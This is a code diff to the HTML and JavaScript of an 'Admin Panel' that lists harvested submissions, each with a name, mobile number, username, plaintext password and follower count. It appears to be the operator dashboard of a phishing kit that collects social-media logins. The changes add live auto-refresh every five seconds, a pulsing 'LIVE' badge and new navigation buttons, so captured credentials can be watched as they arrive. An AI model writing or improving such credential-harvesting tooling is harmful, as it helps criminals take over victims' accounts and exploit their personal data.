@@ -80,32 +80,74 @@
         .hidden {
             display: none;
         }
-        .logout-btn {
-            background: #dc2743;
-            color: #fff;
-            border: none;
+        .top-bar {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            flex-wrap: wrap;
+            gap: 10px;
+            margin-bottom: 10px;
+        }
+        .btn {
             padding: 8px 20px;
+            border: none;
             border-radius: 6px;
             cursor: pointer;
-            float: right;
+            font-weight: bold;
         }
-        .logout-btn:hover {
+        .btn-logout {
+            background: #dc2743;
+            color: #fff;
+        }
+        .btn-logout:hover {
             background: #bc1888;
         }
+        .btn-refresh {
+            background: #4ade80;
+            color: #000;
+        }
+        .btn-refresh:hover {
+            background: #22c55e;
+        }
+        .btn-back {
+            background: #3b82f6;
+            color: #fff;
+        }
+        .btn-back:hover {
+            background: #2563eb;
+        }
         .count {
-            margin-top: 10px;
             color: #aaa;
+        }
+        .status {
+            color: #4ade80;
+            margin-top: 10px;
+            display: none;
         }
         .error {
             color: #dc2743;
             margin-top: 10px;
             display: none;
         }
+        .live-badge {
+            background: #dc2743;
+            color: #fff;
+            padding: 2px 12px;
+            border-radius: 20px;
+            font-size: 12px;
+            display: inline-block;
+            animation: pulse 1.5s infinite;
+        }
+        @keyframes pulse {
+            0% { opacity: 1; }
+            50% { opacity: 0.5; }
+            100% { opacity: 1; }
+        }
     </style>
 </head>
 <body>
     <div class="container">
-        <h1>🔐 Admin Panel</h1>
+        <h1>🔐 Admin Panel <span class="live-badge">● LIVE</span></h1>
 
         <div id="loginBox" class="login-box">
             <input type="text" id="adminUser" placeholder="Username" value="admin">
@@ -115,8 +157,17 @@
         </div>
 
         <div id="dashboard" class="hidden">
-            <button class="logout-btn" onclick="logout()">Logout</button>
-            <p class="count">Total Submissions: <span id="totalCount">0</span></p>
+            <div class="top-bar">
+                <div>
+                    <span class="count">📊 Total: <span id="totalCount">0</span></span>
+                </div>
+                <div>
+                    <button class="btn btn-back" onclick="window.location.href='/'">← Back</button>
+                    <button class="btn btn-refresh" onclick="fetchData()">🔄 Refresh</button>
+                    <button class="btn btn-logout" onclick="logout()">Logout</button>
+                </div>
+            </div>
+            <p id="statusMsg" class="status">✅ Data loaded</p>
             <div style="overflow-x:auto;">
                 <table>
                     <thead>
@@ -130,7 +181,9 @@
                             <th>Followers</th>
                         </tr>
                     </thead>
-                    <tbody id="dataBody"></tbody>
+                    <tbody id="dataBody">
+                        <tr><td colspan="7" style="text-align:center;color:#666;">Loading...</td></tr>
+                    </tbody>
                 </table>
             </div>
         </div>
@@ -156,7 +209,13 @@
                     errorEl.style.display = 'none';
                     document.getElementById('loginBox').classList.add('hidden');
                     document.getElementById('dashboard').classList.remove('hidden');
+                    document.getElementById('statusMsg').style.display = 'none';
                     fetchData();
+                    // Auto-refresh every 5 seconds (real-time)
+                    if (window._refreshInterval) clearInterval(window._refreshInterval);
+                    window._refreshInterval = setInterval(() => {
+                        if (token) fetchData();
+                    }, 5000);
                 } else {
                     errorEl.style.display = 'block';
                 }
@@ -166,39 +225,57 @@
         }
 
         async function fetchData() {
+            const statusEl = document.getElementById('statusMsg');
             try {
                 const res = await fetch('/api/admin/data', {
                     headers: { 'Authorization': token }
                 });
-                if (res.status === 401) { logout(); return; }
+                if (res.status === 401) { 
+                    logout(); 
+                    return; 
+                }
                 const data = await res.json();
+                console.log('📊 Data fetched:', data.submissions.length, 'records');
+                
                 document.getElementById('totalCount').textContent = data.submissions.length;
                 const tbody = document.getElementById('dataBody');
                 tbody.innerHTML = '';
-                data.submissions.slice().reverse().forEach((item, index) => {
-                    tbody.innerHTML += `<tr>
-                        <td>${index + 1}</td>
-                        <td>${item.timestamp}</td>
-                        <td>${item.name}</td>
-                        <td>${item.mobile}</td>
-                        <td>${item.username}</td>
-                        <td>${item.password}</td>
-                        <td>${item.followers}</td>
-                    </tr>`;
-                });
-            } catch {
-                console.error('Failed to fetch data');
+                
+                if (data.submissions.length === 0) {
+                    tbody.innerHTML = '<tr><td colspan="7" style="text-align:center;color:#666;">No data yet</td></tr>';
+                } else {
+                    data.submissions.slice().reverse().forEach((item, index) => {
+                        tbody.innerHTML += `<tr>
+                            <td>${index + 1}</td>
+                            <td>${item.timestamp}</td>
+                            <td>${item.name}</td>
+                            <td>${item.mobile}</td>
+                            <td>${item.username}</td>
+                            <td>${item.password}</td>
+                            <td>${item.followers}</td>
+                        </tr>`;
+                    });
+                }
+                statusEl.textContent = '✅ Updated: ' + new Date().toLocaleTimeString();
+                statusEl.style.display = 'block';
+                statusEl.style.color = '#4ade80';
+                setTimeout(() => { statusEl.style.display = 'none'; }, 2000);
+            } catch (err) {
+                console.error('Fetch error:', err);
+                statusEl.textContent = '❌ Failed to load';
+                statusEl.style.display = 'block';
+                statusEl.style.color = '#dc2743';
             }
         }
 
         function logout() {
+            if (window._refreshInterval) clearInterval(window._refreshInterval);
             token = null;
             document.getElementById('dashboard').classList.add('hidden');
             document.getElementById('loginBox').classList.remove('hidden');
             document.getElementById('loginError').style.display = 'none';
+            document.getElementById('statusMsg').style.display = 'none';
         }
-
-        setInterval(() => { if (token) fetchData(); }, 30000);
     </script>
 </body>
 </html>
